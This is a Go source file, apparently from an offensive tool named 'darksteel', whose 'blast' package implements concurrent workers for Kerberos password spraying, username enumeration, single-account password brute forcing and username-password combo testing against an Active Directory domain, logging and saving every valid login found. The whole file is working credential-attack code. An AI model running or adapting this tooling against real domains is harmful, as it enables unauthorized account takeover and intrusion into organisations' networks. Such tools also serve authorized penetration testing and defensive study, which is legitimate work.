package blast

import (
	"context"
	"darksteel/process"
	"fmt"
	"sync"
)

// PasswordSpray 使用
func makeSprayWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, password string, verbose bool, outFileName string, domain string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			testLogin(ctx, username, password, verbose, outFileName, domain)
		}
	}
}

func testLogin(ctx context.Context, username string, password string, verbose bool, outFileName string, domain string) {
	login := fmt.Sprintf("%v@%v:%v", username, domain, password)
	if ok, err := kSession.TestLogin(username, password); ok && outFileName == "" {
		if err != nil {
			fmt.Printf("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)\n", login, err)
		} else {
			fmt.Printf("[+] SUCCESS:\t %s\n", login)
		}
	} else if ok && outFileName != "" {
		if err != nil {
			fmt.Printf("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)\n", login, err)
			process.OutFile(fmt.Sprintf("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)\n", login, err), outFileName)
		} else {
			fmt.Printf("[+] SUCCESS:\t %s\n", login)
			process.OutFile(fmt.Sprintf("[+] SUCCESS:\t %s\n", login), outFileName)
		}
	} else if ok == false && verbose && outFileName == "" {
		// 判断错误类型，并输出
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			fmt.Printf("[!] %v - %v\n", login, errorString)
			cancel()
		} else {
			fmt.Printf("[!] %v - %v\n", login, errorString)
		}
	} else if ok == false && verbose && outFileName != "" {
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			fmt.Printf("[!] %v - %v\n", login, errorString)
			process.OutFile(fmt.Sprintf("[!] %v - %v\n", login, errorString), outFileName)
			cancel()
		} else {
			fmt.Printf("[!] %v - %v\n", login, errorString)
			process.OutFile(fmt.Sprintf("[!] %v - %v\n", login, errorString), outFileName)
		}
	}
}

// UserEnum 使用
func makeEnumWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, verbose bool, outFileName string, domain string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			testUsername(ctx, username, verbose, outFileName, domain)
		}
	}
}

func testUsername(ctx context.Context, username string, verbose bool, outFileName string, domain string) {
	usernameFull := fmt.Sprintf("%v@%v", username, domain)
	valid, err := kSession.TestUsername(username)

	if valid && outFileName == "" {
		if err != nil {
			fmt.Printf("[+] VALID USERNAME WITH ERROR:\t %s\t (%s)\n", username, err)
		} else {
			fmt.Printf("[+] USERNAME:\t %s\n", usernameFull)
		}
	} else if valid && outFileName != "" {
		if err != nil {
			fmt.Printf("[+] VALID USERNAME WITH ERROR:\t %s\t (%s)\n", username, err)
			process.OutFile(fmt.Sprintf("[+] VALID USERNAME WITH ERROR:\t %s\t (%s)\n", username, err), outFileName)
		} else {
			fmt.Printf("[+] USERNAME:\t %s\n", usernameFull)
			process.OutFile(fmt.Sprintf("[+] USERNAME:\t %s\n", usernameFull), outFileName)
		}
	} else if verbose && outFileName == "" {
		if err != nil {
			// 判断错误类型，并输出
			ok, errorString := kSession.HandleKerbError(err)
			if !ok {
				fmt.Printf("[!] %v - %v\n", usernameFull, errorString)
				cancel()
			} else {
				fmt.Printf("[!] %v - %v\n", usernameFull, errorString)
			}
		} else {
			fmt.Printf("[!] Unknown behavior - %v\n", usernameFull)
		}
	} else if verbose && outFileName != "" {
		if err != nil {
			// 判断错误类型，并输出
			ok, errorString := kSession.HandleKerbError(err)
			if !ok {
				fmt.Printf("[!] %v - %v\n", usernameFull, errorString)
				process.OutFile(fmt.Sprintf("[!] %v - %v\n", usernameFull, errorString), outFileName)
				cancel()
			} else {
				fmt.Printf("[!] %v - %v\n", usernameFull, errorString)
				process.OutFile(fmt.Sprintf("[!] %v - %v\n", usernameFull, errorString), outFileName)
			}
		} else {
			fmt.Printf("[!] Unknown behavior - %v\n", usernameFull)
			process.OutFile(fmt.Sprintf("[!] Unknown behavior - %v\n", usernameFull), outFileName)
		}
	}
}

// BlastPassword 使用
func makeBruteWorker(ctx context.Context, passwords <-chan string, wg *sync.WaitGroup, username string, verbose bool, outFileName string, domain string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case password, ok := <-passwords:
			if !ok {
				return
			}
			testLogin(ctx, username, password, verbose, outFileName, domain)
		}
	}
}

// UserPass 使用
func makeBruteComboWorker(ctx context.Context, combos <-chan [2]string, wg *sync.WaitGroup, verbose bool, outFileName string, domain string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case combo, ok := <-combos:
			if !ok {
				return
			}
			testLogin(ctx, combo[0], combo[1], verbose, outFileName, domain)
		}
	}
}
